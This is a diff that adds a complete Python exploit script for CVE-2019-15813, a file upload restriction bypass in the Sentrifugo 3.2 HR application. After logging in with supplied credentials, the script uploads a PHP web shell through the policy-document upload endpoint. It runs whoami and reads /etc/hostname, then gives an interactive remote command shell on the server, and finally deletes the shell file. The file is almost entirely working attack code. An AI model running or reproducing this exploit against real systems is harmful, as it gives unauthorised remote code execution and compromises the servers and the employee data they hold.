@@ -1,0 +1,96 @@
+# Exploit Title: Sentrifugo 3.2 - File Upload Restriction Bypass (Authenticated)
+# Date: 26/10/2020
+# Exploit Author: Gurkirat Singh <tbhaxor@gmail.com>
+# Vendor Homepage: http://www.sentrifugo.com/
+# POC Link: https://www.exploit-db.com/exploits/47323
+# Version: 3.2
+# Tested on: Linux and Windows
+# CVE : CVE-2019-15813
+# Contact Details: https://google.com/search?q=tbhaxor
+
+from argparse import ArgumentParser, RawTextHelpFormatter
+from bs4 import BeautifulSoup, Tag
+from requests.sessions import Session
+import tempfile as tmp
+import os.path as path
+import random
+import string
+from huepy import *
+
+parser = ArgumentParser(description="Exploit for CVE-2019-15813",
+                        formatter_class=RawTextHelpFormatter)
+parser.add_argument("--target",
+                    "-t",
+                    help="target uri where application is installed",
+                    required=True,
+                    metavar="",
+                    dest="t")
+parser.add_argument("--user",
+                    "-u",
+                    help="username to authenticate",
+                    required=True,
+                    metavar="",
+                    dest="u")
+parser.add_argument("--password",
+                    "-p",
+                    help="password to authenticate",
+                    required=True,
+                    metavar="",
+                    dest="p")
+args = parser.parse_args()
+
+if args.t.endswith("/"):
+    args.t = args.t[:-1]
+
+F = "".join(random.choices(string.ascii_letters, k=13)) + ".php"
+
+with Session() as http:
+    print(run("Logging in"))
+    data = {"username": args.u, "password": args.p}
+
+    r = http.post(args.t + "/index.php/index/loginpopupsave",
+                  data=data,
+                  allow_redirects=False)
+
+    if not (r.headers.get("Location", "").endswith("welcome")
+            or r.headers.get("Location", "").endswith("welcome/")):
+        print(bad("Unable to login. Check username / password"))
+        exit(1)
+    print(good("Logged in"))
+
+    print(run("Exploiting"))
+    files = {"myfile": ("shell.php", "<?php system($_POST['cmd']); ?>")}
+
+    r = http.post(args.t + "/index.php/policydocuments/uploaddoc", files=files)
+    if r.status_code != 200:
+        print(bad("Unable to upload file"))
+        exit(1)
+    file_name = r.json()["filedata"]["new_name"]
+    print(info("Spawning shell"))
+
+    user = http.post(args.t + "/public/uploads/policy_doc_temp/" + file_name,
+                     data={"cmd": "whoami"})
+    host = http.post(args.t + "/public/uploads/policy_doc_temp/" + file_name,
+                     data={"cmd": "cat /etc/hostname"})
+    shell = f"{lightgreen('%s@%s'%(user.content.decode().strip(), host.content.decode().strip()))}{blue('$ ')}"
+
+    while True:
+        try:
+            cmd = input(shell)
+            if cmd == "exit": break
+            r = http.post(args.t + "/public/uploads/policy_doc_temp/" +
+                          file_name,
+                          data={"cmd": cmd})
+            print(r.content.decode().strip())
+        except Exception as e:
+            print()
+            break
+
+    print(run("Cleaning"))
+    http.post(args.t + "/public/uploads/policy_doc_temp/" + file_name,
+              data={"cmd": "rm %s" % file_name})
+    r = http.get(args.t + "/public/uploads/policy_doc_temp/" + file_name)
+    if r.status_code == 404:
+        print(good("Cleaned"))
+    else:
+        print(bad("Unable to clean the file"))
